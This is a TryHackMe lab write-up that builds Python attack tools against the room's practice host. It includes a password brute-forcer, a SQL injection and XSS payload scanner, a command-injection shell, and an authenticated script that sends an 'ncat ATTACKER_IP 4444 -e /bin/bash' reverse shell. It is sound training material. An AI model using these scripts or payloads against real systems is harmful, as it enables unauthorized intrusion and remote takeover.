
# TryHackMe: Custom Tooling Using Python - Write-up

This write-up covers the process of building custom penetration testing tools using Python. The room demonstrates how to automate tasks like brute-forcing, vulnerability scanning, command execution, and establishing authenticated reverse shells.

## Prerequisites: Setting up the Host

Before interacting with the labs, we need to map the target IP to the given domain in our `/etc/hosts` file.

```bash
sudo nano /etc/hosts
# Add the following line (replace with your actual target IP):
# <TARGET_IP> python.thm
```

---

## Lab 1: Brute Forcing Authentication

**Target:** `http://python.thm/labs/lab1/index.php`

Our first objective is to bypass the login portal by brute-forcing a numeric 4-digit password for the `admin` user. We can accomplish this using the Python `requests` library.

### The Brute-Force Script (`bruteforce.py`)

We generate a list of all possible 4-digit combinations (0000-9999) and send POST requests until the response does not contain the "Invalid" error message.

```python
import requests 

url = "http://python.thm/labs/lab1/index.php" 
username = "admin" 

# Generating 4-digit numeric passwords (0000-9999) 
password_list = [str(i).zfill(4) for i in range(10000)] 

def brute_force(): 
    for password in password_list: 
        data = {"username": username, "password": password} 
        response = requests.post(url, data=data) 
        
        if "Invalid" not in response.text: 
            print(f"[+] Found valid credentials: {username}:{password}") 
            break 
        else: 
            print(f"[-] Attempted: {password}") 

brute_force()
```

**Output:**
```text
[-] Attempted: 1231
[-] Attempted: 1232
[-] Attempted: 1233
[+] Found valid credentials: admin:1234
```
*Note: A secondary script utilizing `itertools.product` and a generator was also tested to accommodate alphanumeric passwords if needed.*

---

## Lab 2: Custom Vulnerability Scanner

**Target:** `http://python.thm/labs/lab2/greetings.php?id=`

Next, we write a multi-threaded Python scanner to test URL parameters for common SQL Injection (SQLi) and Cross-Site Scripting (XSS) vulnerabilities.

### The Scanner Script (`scanner.py`)

This script sends various payloads and analyzes the HTTP response text for reflected inputs (XSS) or database error messages (SQLi).

```python
import requests 
import threading 

url = "http://python.thm/labs/lab2/greetings.php?id=" 
payloads = { 
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"], 
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"] 
} 

sqli_errors = [ 
    "SQL syntax", "SQLite3::query():", "MySQL server", "syntax error", 
    "Unclosed quotation mark", "near 'SELECT'", "Unknown column", 
    "Warning: mysql_fetch", "Fatal error" 
] 

def scan_payload(vuln_type, payload): 
    response = requests.get(url, params={"id": payload}) 
    content = response.text.lower() 
    
    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors): 
        print(f"[+] Potential SQL injection detected with payload: {payload}") 
    elif vuln_type == "XSS" and payload.lower() in content: 
        print(f"[+] Potential XSS detected with payload: {payload}") 

# Multi-threading for faster scanning
threads = [] 
for vuln, tests in payloads.items(): 
    for payload in tests: 
        t = threading.Thread(target=scan_payload, args=(vuln, payload)) 
        threads.append(t) 
        t.start() 

# Wait for all threads to finish 
for t in threads: 
    t.join()
```

**Output:**
```bash
$ python3 scanner.py
[+] XSS detected with: <script>alert('XSS')</script>
[+] XSS detected with: '><img src=x onerror=alert('XSS')>
```

---

## Lab 3: Exploiting Command Injection

**Target:** `http://python.thm/labs/lab3/execute.php?cmd=`

In this lab, the target is vulnerable to Remote Code Execution (RCE) via the `cmd` GET parameter. We can write a script to simulate an interactive shell, making it much easier to enumerate the system.

### Interactive Exploit Shell (`roomex.py`)

```python
import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

print("[+] Interactive Exploit Shell")
while True:
    cmd = input("Shell> ")  
    if cmd.lower() in ["exit", "quit"]:
        break
    
    response = requests.get(TARGET_URL + cmd)
    
    if response.status_code == 200:
        print(response.text)
    else:
        print("[-] Exploit failed. HTTP Status:", response.status_code)
```

**Exploitation & Flag Retrieval:**
```bash
$ python3 roomex.py
[+] Interactive Exploit Shell
Shell> whoami
www-data

Shell> ls
execute.php
flag.txt
index.php

Shell> cat flag.txt
THM{basic_exploit_using_python}
```

---

## Lab 4: Authenticated RCE & Reverse Shell

**Targets:** 
- Login: `http://python.thm/labs/lab4/login.php`
- Dashboard: `http://python.thm/labs/lab4/dashboard.php`

For the final task, we must authenticate using known credentials (`admin:password123`) before we can execute commands. We use `requests.Session()` to retain the authentication cookies and automatically pass them to the vulnerable dashboard to trigger a reverse shell.

### Session Handling & Shell Script (`revshell.py`)

```python
import requests

LOGIN_URL = "http://python.thm/labs/lab4/login.php"
EXECUTE_URL = "http://python.thm/labs/lab4/dashboard.php"
USERNAME = "admin"
PASSWORD = "password123"

def authenticate():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"username": USERNAME, "password": PASSWORD})

    if "Welcome" in response.text:
        print("[+] Authentication successful.")
        return session
    return None

def execute_command(session, command):
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = authenticate()

    print(f"[+] Output:\n{response.text}")

def get_reverse_shell(session, attacker_ip, attacker_port):
    # Ensure you have a netcat listener running: nc -lvnp 4444
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
    print(f"[*] Sending reverse shell payload to {attacker_ip}:{attacker_port}...")
    execute_command(session, payload)

session = authenticate()
if session:
    execute_command(session, "whoami")
    
    # Replace ATTACKER_IP with your TryHackMe VPN IP
    get_reverse_shell(session, "ATTACKER_IP", 4444) 
```

**Usage:**
1. Start a netcat listener on your attacking machine: `nc -lvnp 4444`
2. Run the Python script.
3. Catch the shell and escalate privileges or read the final flags!
